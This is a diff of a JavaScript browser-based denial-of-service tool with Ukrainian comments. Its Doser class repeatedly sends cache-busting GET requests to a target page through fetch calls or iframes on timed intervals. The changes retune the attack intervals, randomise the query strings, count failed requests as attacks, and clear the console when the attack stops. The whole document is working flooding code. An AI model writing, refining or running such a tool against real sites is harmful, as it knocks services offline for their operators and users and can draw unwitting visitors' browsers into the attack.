@@ -1,17 +1,18 @@
-const attackInterval = 200
+const fetchAttackInterval = 500
+const iframeAttackInterval = 600
 
 /**
  * Зберігання данних про атаки
- * @param {Response} r **Запит**
  */
-function add_count(r) {
-    attacks.text(parseInt(attacks.text()) + 1);
-    (d => d.attacks ? d.attacks = parseInt(d.attacks) + 1 : d.attacks = 1)(Database)
-    console.log(r.ok)
+function add_count() {
+	if (!lockAttackCount) {
+		attacks.text(parseInt(attacks.text()) + 1);
+    	(d=>d.attacks = parseInt(d.attacks) + 1)(Database)
+	} 
 }
 
 /**
- * Паказ цілі користувачу
+ * Показ цілі користувачу
  * @param {?JSON} target **Ціль**
  */
 function setTarget(target) {
@@ -19,14 +20,14 @@ function setTarget(target) {
 		targetField.text(target.page);
 	    methodField.text("GET");
 	    return true
-	};
+	}
 }
 
 /**
  * Генерація **GET** запиту
  * @param {JSON} target **Ціль**
  */
-const composeVictim = async target => `${target.page}?data=${getRandomArbitrary()}`;
+const composeVictim = async target => `${target.page}?data=${randomString(64)}`;
 
 /**
  * Воркер
@@ -34,10 +35,11 @@ const composeVictim = async target => `${target.page}?data=${getRandomArbitrary(
 class Doser {
 	/**
 	 * Запуск атаки
-	 * @param {Boolean} isFetch 
+	 * @param {Boolean} isFetch
 	 */
     async start(isFetch=true) {
     	this.attack = true; // Статус атаки
+    	lockAttackCount = false // Розблокування лічильника
 
         // Запуск атаки
         btn.text("Стоп");
@@ -68,10 +70,10 @@ class Doser {
 				cache: 'no-cache',
 				expires: 0
 	        })
-	        .catch(()=>{})
+	        .catch(add_count)
 	        .then(add_count)
 
-        }, 50) : setInterval(async () => {
+        }, fetchAttackInterval) : setInterval(async () => {
         	// Надсилання запиту на сайт за допомогою елементу iframe
 
         	await Frames.draw(target);
@@ -79,7 +81,7 @@ class Doser {
         	add_count();
 
         	if ($("#frames")[0].childElementCount >= 100) Frames.clear();
-        }, attackInterval)
+        }, iframeAttackInterval)
     };
 	/**
 	 * Зупинка атаки
@@ -87,8 +89,10 @@ class Doser {
     stop() {
     	if (this.interval) {
 	    	this.attack = false;
+	    	lockAttackCount = true;
 	    	clearInterval(this.interval);
 	    	Frames.clear();
+	    	console.clear();
 	    	btn.text("Старт!")
     	}
     };
